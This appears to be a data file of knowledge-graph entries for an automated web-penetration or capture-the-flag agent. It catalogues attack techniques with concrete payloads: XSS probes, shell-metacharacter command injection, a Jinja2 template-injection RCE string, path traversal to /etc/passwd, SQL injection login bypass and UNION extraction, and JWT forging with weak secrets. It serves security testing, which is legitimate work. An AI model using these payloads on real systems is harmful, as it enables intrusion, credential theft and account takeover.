nodes.title: Reflected XSS — Query Parameter Injection
nodes.description: Reflected Cross-Site Scripting occurs when user input in URL parameters is reflected back in the HTML response without sanitization. Test all query parameters for script reflection.
techniques: Inject <script>alert(1)</script> in every query parameter
Try event handlers:
Try attribute break-out: '"><script>alert(1)</script>
If blocked by WAF, try encoding: double URL encode, HTML entities
Check for Content-Security-Policy header that might block execution
nodes.embed_text: XSS: Reflected XSS — Query Parameter Injection. Reflected Cross-Site Scripting occurs when user input in URL parameters is reflected back in the HTML response without sanitization. Test all query parameters for script reflection. Indicators: Input reflected in response; No CSP header; User-controllable query parameters; Error messages showing raw input. Tags: xss, injection, web, reflected.

nodes.title: Command Injection — Shell Metacharacters
nodes.description: When user input is passed to shell commands without sanitization, inject shell metacharacters to execute arbitrary commands. Common in ping, traceroute, file upload, and system utility endpoints.
techniques: Inject semicolon: ; id
Inject pipe: | id
Inject backtick: `id`
Inject subshell: $(id)
Inject newline: %0aid (in URL)
If filtered, try: ||id, &&id, %0aid, `id`
Check response for command output (uid=, gid=, root:, etc.)
nodes.embed_text: CMDI: Command Injection — Shell Metacharacters. When user input is passed to shell commands without sanitization, inject shell metacharacters to execute arbitrary commands. Common in ping, traceroute, file upload, and system utility endpoints. Indicators: System utility endpoints (ping, nslookup); File operations; Shell error messages; Path-like parameters. Tags: cmdi, injection, web, shell.

nodes.title: Server-Side Template Injection — Jinja2/FastAPI
nodes.description: Template engines like Jinja2 (Flask/FastAPI) can execute arbitrary code if user input is embedded in templates without sanitization. Test with template syntax injection.
techniques: Inject {{7*7}} — if response shows 49, SSTI confirmed
Jinja2 RCE: {{ ''.__class__.__mro__[1].__subclasses__() }}
Simpler probe: ${7*7}, {{config}}, {{self}}
If Jinja2 confirmed: {{ lipsum.__globals__['os'].popen('id').read() }}
Check for template engine indicators in headers or error messages
nodes.embed_text: SSTI: Server-Side Template Injection — Jinja2/FastAPI. Template engines like Jinja2 (Flask/FastAPI) can execute arbitrary code if user input is embedded in templates without sanitization. Test with template syntax injection. Indicators: Jinja2/FastAPI/Flask server; User input in page rendering; Template syntax in error messages; {{ }} in response. Tags: ssti, injection, web, jinja2, fastapi, flask.

nodes.title: Local File Inclusion — Path Traversal
nodes.description: When file paths are constructed from user input, use ../ sequences to escape the intended directory and read sensitive files. Common in file download, image serving, and template endpoints.
techniques: Try: ../../../etc/passwd
Try: ....//....//....//etc/passwd (if ../ is filtered)
Try: /etc/passwd (absolute path)
Try null byte: ../../../etc/passwd%00 (legacy PHP)
Try PHP wrappers: php://filter/convert.base64-encode/resource=index.php
Target high-value files: /etc/passwd, /flag, /app/flag.txt, /proc/self/environ
Check response for file contents or error messages
nodes.embed_text: LFI: Local File Inclusion — Path Traversal. When file paths are constructed from user input, use ../ sequences to escape the intended directory and read sensitive files. Common in file download, image serving, and template endpoints. Indicators: File path parameters (?file=, ?path=, ?template=); Download endpoints; Error messages with file paths; Static file serving. Tags: lfi, path-traversal, web, file-read.

nodes.title: Indirect IDOR — State-Changing Actions Without Auth Check
nodes.description: Some IDORs require first performing a state-changing action (archive, share, transfer) that lacks authorization checks. After changing ownership, the resource becomes accessible. Look for actions that change resource ownership without verifying the caller.
techniques: Find endpoints that change resource state: /archive, /share, /transfer, /assign, /claim
Try these actions on resources belonging to other users
After state change, check if the resource is now accessible via your session
Look for actions that are GET-based (no CSRF protection)
Check if the state change assigns you as the new owner/archiver
nodes.embed_text: IDOR: Indirect IDOR — State-Changing Actions Without Auth Check. Some IDORs require first performing a state-changing action (archive, share, transfer) that lacks authorization checks. After changing ownership, the resource becomes accessible. Look for actions that change resource ownership without verifying the caller. Indicators: Resource action endpoints; State-changing GET requests; Missing CSRF tokens; Archive/share/claim patterns. Tags: idor, authorization, state-change, web, indirect.

nodes.title: Authentication Bypass — Header Injection (X-Forwarded, X-Original)
nodes.description: Applications behind proxies or API gateways may trust headers like X-Forwarded-User, X-Original-URL, X-Rewrite-URL. Inject these headers to bypass authentication or access restricted endpoints.
techniques: Try: X-Forwarded-User: admin
Try: X-Original-URL: /admin
Try: X-Rewrite-URL: /flag
Try: X-Forwarded-Host: internal-admin.local
Try: X-Forwarded-For: 127.0.0.1 (local access bypass)
Try: X-Real-IP: 127.0.0.1
Check if response differs (status code, content) with headers vs without
nodes.embed_text: AUTH: Authentication Bypass — Header Injection (X-Forwarded, X-Original). Applications behind proxies or API gateways may trust headers like X-Forwarded-User, X-Original-URL, X-Rewrite-URL. Inject these headers to bypass authentication or access restricted endpoints. Indicators: Proxy/CDN headers in response; API gateway patterns; Internal vs external access differences. Tags: authentication, header-injection, web, proxy, bypass.

nodes.title: IDOR with Two-Factor/Multi-Step Authentication
nodes.description: Multi-step login flows (username → password → 2FA) may have IDOR in intermediate steps. After submitting username, the password page may expose user IDs or accept headers that allow impersonating other users.
techniques: After username step, check if response contains user_id or account_id
If user_id is in response, modify it and re-submit
Check if hidden fields (user_id, account_id) are tamperable
Try skipping steps: go directly to dashboard after username step
Check if session tokens are predictable or weakly signed
nodes.embed_text: IDOR: IDOR with Two-Factor/Multi-Step Authentication. Multi-step login flows (username → password → 2FA) may have IDOR in intermediate steps. After submitting username, the password page may expose user IDs or accept headers that allow impersonating other users. Indicators: Multi-step login; Hidden user_id fields; Welcome messages before authentication; Two-page login forms. Tags: idor, authentication, multi-step, web.

nodes.title: FastAPI/OpenAPI — Full API Surface Discovery and Exploitation
nodes.description: FastAPI applications expose complete API documentation at /openapi.json. This reveals every endpoint, parameter, request body field, and authentication requirement. Use this to plan comprehensive exploitation.
techniques: Fetch /openapi.json and parse all paths and methods
Identify POST endpoints with interesting body fields (is_admin, role, permissions)
Find endpoints with {id} path parameters — IDOR targets
Find endpoints without authentication requirements (no security: [...] in spec)
Test every POST endpoint with modified request bodies
Look for PATCH/PUT endpoints that allow partial updates (mass assignment)
Check for hidden/debug endpoints not shown in the UI
nodes.embed_text: RECON: FastAPI/OpenAPI — Full API Surface Discovery and Exploitation. FastAPI applications expose complete API documentation at /openapi.json. This reveals every endpoint, parameter, request body field, and authentication requirement. Use this to plan comprehensive exploitation. Indicators: FastAPI/uvicorn server header; /docs endpoint; /openapi.json accessible; Swagger UI; ReDoc. Tags: recon, api-discovery, fastapi, openapi, swagger, web.

nodes.title: URL Path IDOR — Direct Object Reference in URL
nodes.description: When URLs contain numeric IDs (/order/123, /user/456), try adjacent values to access other users' data.
techniques: Increment/decrement numeric path segments by ±1, ±10
Try common IDs: 0, 1, 2, admin user IDs
Check if authentication is checked per-resource
If data returned differs, you found IDOR
indicators: Same endpoint returns different data for different IDs
nodes.embed_text: IDOR: URL Path IDOR — Direct Object Reference in URL. When URLs contain numeric IDs (/order/123, /user/456), try adjacent values to access other users' data. Indicators: Numeric path segments; Resource names in URL; Same endpoint returns different data for different IDs. Tags: idor, authorization, web.

nodes.title: Header-Based IDOR — Custom Auth Headers
nodes.description: Applications may trust custom HTTP headers (X-UserId, X-Auth-User, X-Forwarded-User) to identify users. Set these headers to different user IDs to access other users' data.
techniques: Try headers: X-UserId, X-User-Id, X-Forwarded-User, X-Auth-User, X-Authenticated-User
Try the header on every authenticated page
If response changes (different user data or status code), you found IDOR
indicators: JavaScript sending X-UserId in fetch requests
nodes.embed_text: IDOR: Header-Based IDOR — Custom Auth Headers. Applications may trust custom HTTP headers (X-UserId, X-Auth-User, X-Forwarded-User) to identify users. Set these headers to different user IDs to access other users' data. Indicators: Dashboard/profile pages showing user info; API endpoints with user-specific data; JavaScript sending X-UserId in fetch requests. Tags: idor, header-injection, web.

nodes.title: POST Body IDOR — Privilege Escalation via Form Fields
nodes.description: Profile edit forms may accept privilege escalation fields (is_admin, role, user_id) that the attacker can tamper with. POST to edit endpoints with these fields set to elevated values.
techniques: On profile/edit pages: POST with is_admin=1, admin=true, role=admin
Change user_id in POST body to another user's ID
Try adding fields: is_admin, admin, role, permissions, groups
After state change, revisit data pages to check for new access
indicators: Admin status indicators in page content
nodes.embed_text: IDOR: POST Body IDOR — Privilege Escalation via Form Fields. Profile edit forms may accept privilege escalation fields (is_admin, role, user_id) that the attacker can tamper with. POST to edit endpoints with these fields set to elevated values. Indicators: Profile/edit forms; Hidden user_id fields in forms; Admin status indicators in page content. Tags: idor, privilege-escalation, web, post.

nodes.title: SQL Injection — Authentication Bypass
nodes.description: Login forms that concatenate user input into SQL queries can be bypassed. Try classic SQLi payloads in username/password fields.
techniques: Username: ' OR '1'='1, admin'--, ' OR 1=1--
Username: ' UNION SELECT 1,'admin','password'--
If SQL error returned, parametrize further
Use sqlmap if available: sqlmap -u URL --data='username=*&password=*'
indicators: Numeric user IDs suggesting DB backend
nodes.embed_text: SQLI: SQL Injection — Authentication Bypass. Login forms that concatenate user input into SQL queries can be bypassed. Try classic SQLi payloads in username/password fields. Indicators: Login forms; Database error messages in responses; Numeric user IDs suggesting DB backend. Tags: sqli, authentication, web.

nodes.title: SQL Injection — UNION-Based Data Extraction
nodes.description: Use UNION SELECT to extract data from other database tables when the query result is displayed on the page.
techniques: Determine column count: ' ORDER BY 1--, ORDER BY 2--, ...
Find visible columns: ' UNION SELECT 1,2,3,4,5--
Extract data: ' UNION SELECT username,password,3,4,5 FROM users--
Use sqlmap with --technique=U for automated UNION exploitation
nodes.embed_text: SQLI: SQL Injection — UNION-Based Data Extraction. Use UNION SELECT to extract data from other database tables when the query result is displayed on the page. Indicators: Tabular data display; Search/filter parameters; Database errors visible. Tags: sqli, data-extraction, web.

nodes.title: Default Credentials
nodes.description: Many applications ship with default test accounts. Try common credential pairs on every login form discovered.
techniques: Try: test/test, admin/admin, admin/password, demo/demo, guest/guest, root/root
Check HTML comments for hints: <!-- TODO: delete test account -->
Look for hardcoded credentials in JavaScript or page source
After login, immediately check all authenticated pages for sensitive data
nodes.embed_text: AUTH: Default Credentials. Many applications ship with default test accounts. Try common credential pairs on every login form discovered. Indicators: Login form detected; HTML comments mentioning accounts; Default installation documentation referenced. Tags: authentication, default-credentials, web.

nodes.title: JWT Token Manipulation
nodes.description: Applications using JWT for authentication may be vulnerable to token manipulation, especially with weak secrets. Try decoding, modifying, and replaying JWTs.
techniques: Decode JWT with jwt.io or Python jose library
Check if 'alg':'none' is accepted (no signature)
Try weak secrets: 'secret', 'your_secret_key', 'password'
Modify 'sub' claim to another user's ID
Check token expiration — may be infinite
Send modified JWT in Authorization: Bearer or Cookie header
indicators: JWT in cookie or Authorization header
nodes.embed_text: AUTH: JWT Token Manipulation. Applications using JWT for authentication may be vulnerable to token manipulation, especially with weak secrets. Try decoding, modifying, and replaying JWTs. Indicators: JWT in cookie or Authorization header; FastAPI/Swagger UI; Bearer token in responses. Tags: authentication, jwt, token-manipulation, web.

nodes.title: API Discovery via Swagger/OpenAPI
nodes.description: FastAPI and other frameworks auto-generate API documentation at /docs or /openapi.json. This reveals ALL endpoints, parameters, and request formats.
techniques: Fetch /openapi.json, /docs, /swagger.json, /api/docs
Parse paths and methods from the OpenAPI spec
Try every discovered endpoint with authentication
Look for {id} parameters in paths — IDOR targets
Look for POST endpoints with interesting field names (is_admin, role)
nodes.embed_text: RECON: API Discovery via Swagger/OpenAPI. FastAPI and other frameworks auto-generate API documentation at /docs or /openapi.json. This reveals ALL endpoints, parameters, and request formats. Indicators: FastAPI/uvicorn server header; Swagger UI at /docs; OpenAPI JSON at /openapi.json. Tags: recon, api-discovery, fastapi, web.

nodes.title: JWT Signature Forging with Weak Secret
nodes.description: JWTs with weak secrets can be forged. FastAPI apps often use 'your_secret_key' or 'secret' as the signing key. Forge a JWT with a different sub claim to access other users' data.
techniques: Decode existing JWT to extract algorithm and claims
Try common weak secrets: 'your_secret_key', 'secret', 'SECRET_KEY', 'changeme'
Use Python jose library to forge token with modified 'sub'
Send forged token in Cookie: access_token=Bearer <forged_jwt>
Access /company/{id}/jobs or similar endpoints with forged token
indicators: Hardcoded SECRET_KEY in source if visible
nodes.embed_text: AUTH: JWT Signature Forging with Weak Secret. JWTs with weak secrets can be forged. FastAPI apps often use 'your_secret_key' or 'secret' as the signing key. Forge a JWT with a different sub claim to access other users' data. Indicators: JWT token; HS256 algorithm; FastAPI/Swagger docs; Hardcoded SECRET_KEY in source if visible. Tags: authentication, jwt, token-forging, web, fastapi.
